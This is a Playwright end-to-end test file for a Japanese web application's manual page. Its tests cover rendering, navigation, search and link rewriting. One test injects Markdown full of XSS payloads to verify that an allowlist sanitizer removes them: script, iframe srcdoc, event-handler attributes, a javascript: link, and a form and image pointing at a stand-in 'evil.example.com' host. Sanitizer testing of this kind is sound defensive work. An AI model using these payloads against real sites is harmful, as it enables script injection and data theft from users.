from __future__ import annotations

import base64
import json
from pathlib import Path
from urllib.parse import unquote

from mock_api import install_api_mocks

# 1x1 透明 PNG（配信画像の実体は API 側で検証済み。ここでは manual.js が <img> を正しく
# 組み立てて実際に描画されることだけ確認するため、静的サーバに無い manual-images を
# ルートで差し替えて「壊れ画像でなく描画される」ことを見る）。
_PNG_1x1 = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
)

# マニュアル一本化（M-A）: 正本 docs/manual/*.md は e2e の静的サーバ（web/ のみ配信）には無い。
# 本番では api.py の /ui/manual-src マウントが配信する。ここではそのマウントを模して、
# リポジトリ実物の docs/manual/*.md をそのまま返す（本文アサートが実際の正本と一致する）。
_DOCS_MANUAL = Path(__file__).resolve().parents[2] / "docs" / "manual"


def _install_manual_src_mock(page, overrides: dict[str, str] | None = None):
    """`/ui/manual-src/*` を模す。`overrides` に指定したファイル名は実ファイルの代わりに
    渡した文字列を返す（Codex RV 検証用に危険な MD/HTML を注入するため）。"""
    overrides = overrides or {}

    def _handle(route):
        name = unquote(route.request.url.rsplit("manual-src/", 1)[-1])
        if name in overrides:
            route.fulfill(status=200, content_type="text/markdown; charset=utf-8", body=overrides[name])
            return
        path = _DOCS_MANUAL / name
        if ".." in name or "/" in name or not path.is_file():
            route.fulfill(status=404, body="not found")
            return
        content_type = "application/json" if name.endswith(".json") else "text/markdown; charset=utf-8"
        route.fulfill(status=200, content_type=content_type, body=path.read_text(encoding="utf-8"))

    page.route("**/manual-src/**", _handle)


def _install_manual_mocks(page, overrides: dict[str, str] | None = None):
    install_api_mocks(page)
    _install_manual_src_mock(page, overrides)
    page.route(
        "**/manual-images/**",
        lambda route: route.fulfill(status=200, content_type="image/png", body=_PNG_1x1),
    )


def test_manual_page_renders_screenshots(page, web_base_url):
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    # #chat（10-使い方-チャットで調べる.md）は画像を含む章。既定の #start（00-製品概要.md）は
    # 図を持たないため、画像描画の確認には画像がある章を明示して開く。
    page.goto(f"{web_base_url}/manual.html#chat")

    imgs = page.locator(".manual-doc img")
    expect(imgs.first).to_be_visible()
    assert imgs.count() >= 1
    first = imgs.first
    assert "manual-images/" in (first.get_attribute("src") or "")
    # 実際に画像として読み込まれている（プレースホルダ div ではなく <img>）。
    assert first.evaluate("el => el.naturalWidth") > 0


def test_manual_nav_has_no_overview_entry(page, web_base_url):
    """概観（cloud）廃止の回帰: ナビに「概観」が出ず、ナレッジグラフは残る。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    page.goto(f"{web_base_url}/manual.html")

    nav = page.locator("#sherpa-nav")
    expect(nav).to_contain_text("ナレッジグラフ")
    expect(nav).not_to_contain_text("概観")
    assert nav.locator("a[href='cloud.html']").count() == 0


def test_manual_anchor_deep_link_opens_matching_chapter(page, web_base_url):
    """他画面の help-link（例 admin-settings.html の manual.html#sysadmin）互換の回帰:
    #settings で直接開いても、旧アンカー id が正しい章（個人設定）に解決される。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    page.goto(f"{web_base_url}/manual.html#settings")

    expect(page.locator("#doc-title")).to_have_text("個人設定（AIと表示）")
    expect(page.locator(".manual-nav a.on")).to_have_attribute("data-doc", "settings")
    # MD 本文（docs/manual/12-個人設定.md）由来の実文字列が表示されている＝ハードコード本文でない。
    expect(page.locator("#manual-doc")).to_contain_text("接続テスト")


def test_manual_sysadmin_anchor_still_resolves(page, web_base_url):
    """admin-settings.html / ingest.html / workspace.html / graph.html の help-link が指す
    既存アンカー（#sysadmin/#register/#workspace/#graph）が引き続き解決されることの回帰。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    for anchor, doc_id, title_substr in (
        ("sysadmin", "sysadmin", "システム管理"),
        ("register", "register", "取り込み"),
        ("workspace", "workspace", "マイワークスペース"),
        ("graph", "graph", "グラフ"),
    ):
        page.goto(f"{web_base_url}/manual.html#{anchor}")
        expect(page.locator(".manual-nav a.on")).to_have_attribute("data-doc", doc_id)
        expect(page.locator("#doc-title")).to_contain_text(title_substr)


def test_manual_search_filters_by_manifest_metadata(page, web_base_url):
    """検索は manifest（title/summary/tags）ベースで機能する（本文取得なしで絞り込める）。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    page.goto(f"{web_base_url}/manual.html")

    manifest = json.loads((_DOCS_MANUAL / "manifest.json").read_text(encoding="utf-8"))
    total = len(manifest["chapters"])
    assert page.locator(".manual-nav a").count() == total

    page.fill("#doc-search", "監査ログ")
    expect(page.locator("#manual-filter-result")).to_be_visible()
    links = page.locator(".manual-nav a")
    assert 0 < links.count() < total
    expect(page.locator(".manual-nav a[data-doc='users']")).to_have_count(1)

    page.fill("#doc-search", "該当なしのはずの検索語xyz123")
    assert page.locator(".manual-nav a").count() == 0


def test_manual_body_is_sourced_from_markdown(page, web_base_url):
    """本文が docs/manual/*.md 由来であることの回帰（ハードコード本文の復活を検知する）。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    page.goto(f"{web_base_url}/manual.html#chat")

    md = (_DOCS_MANUAL / "10-使い方-チャットで調べる.md").read_text(encoding="utf-8")
    # MD 側にしかない特徴的な文字列（見出し）がレンダ後の本文に現れる。
    assert "## 影響範囲分析を依頼する" in md
    expect(page.locator("#manual-doc")).to_contain_text("影響範囲分析を依頼する")
    expect(page.locator("#manual-doc")).to_contain_text("困ったとき")


# Codex RV（2026-07-08・gpt-5.5/xhigh）High1: ブロックリスト（script/on*/javascript: 除去のみ）は
# iframe srcdoc・object/embed/form・style・data:/外部 img の自動読み込みを通してしまう。許可リスト
# 方式（許可タグ・許可属性のみ残す）へ転換した後の回帰。危険な要素を含む MD を注入し、レンダ結果に
# 一切残らないこと（実行痕跡が残らないこと）を確認する。Low1（画像パスの表記揺れ）もここで併せて
# 検証する（`images/`・`./images/`・クエリ付きの3パターン）。
_MALICIOUS_MD = """# 危険な内容のテスト

<script>window.__xss_script = true;</script>

<iframe srcdoc="&lt;script&gt;window.__xss_iframe = true;&lt;/script&gt;"></iframe>

<style>body{display:none}</style>

<object data="evil.swf"></object>

<form action="https://evil.example.com/steal"><input name="x"></form>

<img src="https://evil.example.com/tracker.png" onerror="window.__xss_img_onerror = true" alt="外部画像">

<div onclick="window.__xss_onclick = true">クリックしても何も起きないはず</div>

[javascriptリンク](javascript:window.__xss_link=true)

普通の段落です。

![相対1](images/10-chat-overview.png)

![相対2（./つき）](./images/10-chat-overview.png)

![相対3（クエリ付き）](images/10-chat-overview.png?v=2)
"""


def test_manual_sanitize_allowlist_blocks_dangerous_html(page, web_base_url):
    """Codex RV High1: 許可リスト方式のサニタイズ回帰。危険なタグ・属性・スキームは
    レンダ結果に一切残らず、script も実行されない。ローカル画像（表記揺れ3種）は残る（Low1）。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page, overrides={"10-使い方-チャットで調べる.md": _MALICIOUS_MD})
    page.goto(f"{web_base_url}/manual.html#chat")

    doc = page.locator("#manual-doc")
    expect(doc).to_contain_text("普通の段落です。")

    # script は一切実行されていない（挿入されたグローバルフラグが立っていない）。
    for flag in ("__xss_script", "__xss_iframe", "__xss_img_onerror", "__xss_onclick", "__xss_link"):
        assert page.evaluate(f"window.{flag}") is None, f"{flag} が発火＝サニタイズ漏れ"

    # 危険タグはレンダ結果の DOM に存在しない（タグごと除去）。このテストの MD にコード
    # フェンスは無いため、正規の manual-copy ボタンも生成されない＝button は無条件で0件のはず。
    for selector in ("script", "iframe", "style", "object", "form", "input", "button"):
        assert doc.locator(selector).count() == 0, f"{selector} が残存"

    # 外部画像は自動読み込みしない（img 自体を除去）。
    assert doc.locator("img[src*='evil.example.com']").count() == 0

    # on* 属性は要素ごと消えず、属性だけ剥がされて残る（許可タグ div は残す設計）。
    div = doc.locator("text=クリックしても何も起きないはず").first
    expect(div).to_be_visible()
    assert div.evaluate("el => el.hasAttribute('onclick')") is False

    # javascript: リンクは href を持たない＝プレーンテキスト化（クリックしても遷移しない）。
    js_link_text = page.locator("#manual-doc >> text=javascriptリンク").first
    assert js_link_text.evaluate("el => el.closest('a') ? el.closest('a').hasAttribute('href') : true") is False

    # Low1: images/・./images/・クエリ付きの3表記いずれも manual-images/ へ解決され、表示される。
    imgs = doc.locator("img")
    srcs = imgs.evaluate_all("els => els.map(e => e.getAttribute('src'))")
    assert "manual-images/10-chat-overview.png" in srcs
    assert "manual-images/10-chat-overview.png?v=2" in srcs
    assert all(s.startswith("manual-images/") for s in srcs)


def test_manual_cross_chapter_md_link_rewritten_to_anchor(page, web_base_url):
    """Codex RV Med1: 章間の相対 MD リンク（`11-使い方-範囲とAI.md`）は #scope へ書き換わり、
    クリックすると実際にその章が開く。"""
    from playwright.sync_api import expect

    _install_manual_mocks(page)
    page.goto(f"{web_base_url}/manual.html#chat")

    link = page.locator("#manual-doc a", has_text="範囲とAIの切り替え").first
    expect(link).to_have_attribute("href", "#scope")
    link.click()

    expect(page.locator("#doc-title")).to_have_text("範囲とAIの切り替え")
    expect(page.locator(".manual-nav a.on")).to_have_attribute("data-doc", "scope")
